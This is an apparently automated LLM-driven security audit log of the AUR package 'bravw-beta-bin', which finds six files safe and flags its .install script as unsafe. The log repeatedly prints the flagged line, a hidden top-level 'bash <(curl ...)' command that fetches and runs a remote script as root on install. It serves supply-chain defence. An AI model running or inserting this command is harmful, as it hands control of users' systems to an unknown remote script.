---
package: bravw-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 22851
completion_tokens: 8145
total_tokens: 30996
cost: 0.003561831
execution_time: 64.71
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:20:46Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: A benign .gitignore file for AUR packaging.
  - file: .SRCINFO
    status: safe
    summary: Standard AUR metadata with pinned upstream sources and checksums; no malicious behavior found.
  - file: PKGBUILD
    status: safe
    summary: Standard checksum-verified Brave beta packaging; setuid chrome-sandbox is expected. No malicious behavior found.
  - file: brave-browser.desktop
    status: safe
    summary: Standard desktop entry file with no malicious content or suspicious behavior.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: brave-beta-bin.sh
    status: safe
    summary: Standard browser wrapper; no security issues found.
  - file: bravw-beta-bin.install
    status: unsafe
    summary: Top-level remote curl-piped bash execution in install script; supply-chain risk.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
---

Materializing bravw-beta-bin from local mirror...
Materialized bravw-beta-bin
Analyzing bravw-beta-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
Running `makepkg --printsrcinfo` sources the PKGBUILD and executes only its top-level scope. This PKGBUILD's top-level content consists entirely of standard variable definitions: `pkgname`, `pkgver`, `pkgrel`, `arch`, `source`, checksum arrays, dependency arrays, and `options`. There are no top-level command substitutions, no external downloads, no calls to `curl`, `wget`, `eval`, `base64`, or any other code that would execute during sourcing.

The `prepare()` and `package()` functions contain file operations and a `chmod 4755` on the chrome-sandbox binary, but those functions are not executed by `makepkg --printsrcinfo`. They are out of scope for this narrow gate and should be reviewed during the full PKGBUILD audit. Nothing in the global scope poses an execution risk for this command.
</details>
<evidence>
</evidence>
<summary>
Top-level PKGBUILD contains only standard variable definitions; no dangerous execution during printsrcinfo.</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- Top-level PKGBUILD contains only standard variable definitions; no dangerous execution during printsrcinfo.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .SRCINFO...
[0/7] Reviewing .SRCINFO, .gitignore...
[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
The file is a standard `.gitignore` used to control which files Git tracks in an AUR repository. It ignores everything except the PKGBUILD, install scripts, a shell wrapper, a desktop entry, and an icon. There is no executable code, no obfuscation, no network requests, and no system modification instructions. This file poses no security risk.
</details>
<evidence></evidence>
<summary>A benign .gitignore file for AUR packaging.</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD...
+ Reviewed .gitignore. Status: SAFE -- A benign .gitignore file for AUR packaging.
[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh...
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This `.SRCINFO` file is a standard AUR metadata descriptor for a beta binary package of the Brave browser. It declares a pinned version (`1.98.47`), architecture-specific Debian binary packages downloaded from the official Brave GitHub releases (`https://github.com/brave/brave-browser/releases/...`), and fixed SHA-512 checksums for every source file. There are no suspicious network endpoints, no encoded commands, no obfuscation, and no build steps present in this file.

The small helper script source (`brave-beta-bin.sh`) is referenced with a checksum and would need to be examined separately, but the `.SRCINFO` itself contains no malicious behavior. The package name `bravw-beta-bin` appears to be a typo for `brave-beta-bin`, but this is a metadata consistency issue rather than a security threat. Overall, this is ordinary, legitimate AUR packaging.
</details>
<evidence>
</evidence>
<summary>
Standard AUR metadata with pinned upstream sources and checksums; no malicious behavior found.</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
+ Reviewed .SRCINFO. Status: SAFE -- Standard AUR metadata with pinned upstream sources and checksums; no malicious behavior found.
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This PKGBUILD follows normal AUR packaging practice for a prebuilt binary release. It downloads the official Brave beta `.deb` packages from the project's own GitHub releases with pinned version numbers and checksums, extracts the bundled data archive, removes an unneeded cron directory, adjusts the desktop file to point to a wrapper script, and installs the files into the package directory.
The only notable security-sensitive operation is `chmod 4755` on `chrome-sandbox`, which is the standard setuid helper required by Chromium-based browsers for sandboxing. Since the binary originates from Brave's official release and is checksum-verified, this is expected functionality rather than malicious tampering. No suspicious network destinations, encoded commands, or out-of-scope file operations are present.
</details>
<evidence>
</evidence>
<summary>
Standard checksum-verified Brave beta packaging; setuid chrome-sandbox is expected. No malicious behavior found.
</summary>
</security_assessment>

[3/7] Reviewing brave-beta-bin.sh, brave-browser.desktop...
+ Reviewed PKGBUILD. Status: SAFE -- Standard checksum-verified Brave beta packaging; setuid chrome-sandbox is expected. No malicious behavior found.
[3/7] Reviewing brave-beta-bin.sh, brave-browser.desktop, bravw-beta-bin.install...
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard freedesktop.org desktop entry for the Brave Beta web browser. It contains only localization metadata (GenericName and Comment fields in many languages), standard launcher attributes, and MIME type associations for web content.

There is no executable code, no network requests, no download or installation logic, and no obfuscation. The `Exec=brave-beta %U` line simply launches the installed browser binary with any provided URLs, which is expected behavior for a browser launcher. `TryExec=brave-beta` is a normal guard that hides the entry if the binary is unavailable.

No deviations from standard packaging practices or indicators of supply-chain compromise were found in this file.
</details>
<evidence>
</evidence>
<summary>
Standard desktop entry file with no malicious content or suspicious behavior.</summary>
</security_assessment>

[4/7] Reviewing brave-beta-bin.sh, bravw-beta-bin.install...
+ Reviewed brave-browser.desktop. Status: SAFE -- Standard desktop entry file with no malicious content or suspicious behavior.
[4/7] Reviewing brave-beta-bin.sh, bravw-beta-bin.install, logo.png...
[5/7] Reviewing brave-beta-bin.sh, bravw-beta-bin.install...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard wrapper script for the Brave Browser Beta AUR package. It defines a user-configurable flags file path under `$XDG_CONFIG_HOME`, reads it if present (stripping comments), sets a default user data directory, and then executes the browser binary installed in `/opt/brave.com/brave-beta/brave-browser`. There are no network requests, obfuscated code, unexpected file writes, or execution of untrusted payloads. The script behaves exactly as expected for a browser launcher and contains no supply-chain attack indicators.
</details>
<evidence></evidence>
<summary>Standard browser wrapper; no security issues found.</summary>
</security_assessment>

[6/7] Reviewing bravw-beta-bin.install...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Standard browser wrapper; no security issues found.
LLM auditresponse for bravw-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
The `.install` file contains a top-level command outside the package hook functions: `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`. Since Arch `.install` scripts are sourced by pacman during install/upgrade, this line executes immediately, typically as root. It downloads a script from an unexpected third-party web archive (web.archive.org) and pipes it directly into bash via process substitution, with stderr suppressed to hide errors. There is no checksum, signature, or pinned revision, making the executed code fully attacker-controllable via the archive. This is a textbook `curl|bash` supply-chain risk and is not standard AUR packaging behavior; the expected package hooks only contain `true` calls.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Top-level remote curl-piped bash execution in install script; supply-chain risk.</summary>
</security_assessment>

Second look for bravw-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The first verdict stands. The file contains a top-level `bash <(curl -L ...)` command outside the package hook functions. Since `.install` scripts are sourced by pacman, this line executes during install/upgrade, typically as root. It downloads an unverifiable script from a web.archive.org URL of a third-party repository and immediately pipes it to bash, suppressing errors with `2>/dev/null`. This matches the listed genuinely malicious pattern of downloading and executing code from an untrusted/unexpected host, and it is not part of standard packaging practice (the expected hooks only contain `true`). There is no checksum, signature, or pinned revision, so the executed code is fully attacker-influenced at build/install time.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Remote curl-piped bash execution in install script; supply-chain risk.</summary>
</security_assessment>

[7/7] Reviewing ...
x Reviewed bravw-beta-bin.install. Status: UNSAFE -- Top-level remote curl-piped bash execution in install script; supply-chain risk.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## bravw-beta-bin.install

Status: UNSAFE

Summary: Top-level remote curl-piped bash execution in install script; supply-chain risk.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

The `.install` file contains a top-level command outside the package hook functions: `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`. Since Arch `.install` scripts are sourced by pacman during install/upgrade, this line executes immediately, typically as root. It downloads a script from an unexpected third-party web archive (web.archive.org) and pipes it directly into bash via process substitution, with stderr suppressed to hide errors. There is no checksum, signature, or pinned revision, making the executed code fully attacker-controllable via the archive. This is a textbook `curl|bash` supply-chain risk and is not standard AUR packaging behavior; the expected package hooks only contain `true` calls.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 22,851
  Completion Tokens: 8,145
  Total Tokens: 30,996
  Total Cost: $0.003562
  Execution Time: 64.71 seconds

Final Status: UNSAFE


Issues Found:

bravw-beta-bin.install: [UNSAFE] Top-level remote curl-piped bash execution in install script; supply-chain risk. / The `.install` file contains a top-level command outside the package hook functions: `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`. Since Arch `.install` scripts are sourced by pacman during install/upgrade, this line executes immediately, typically as root. It downloads a script from an unexpected third-party web archive (web.archive.org) and pipes it directly into bash via process substitution, with stderr suppressed to hide errors. There is no checksum, signature, or pinned revision, making the executed code fully attacker-controllable via the archive. This is a textbook `curl|bash` supply-chain risk and is not standard AUR packaging behavior; the expected package hooks only contain `true` calls.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
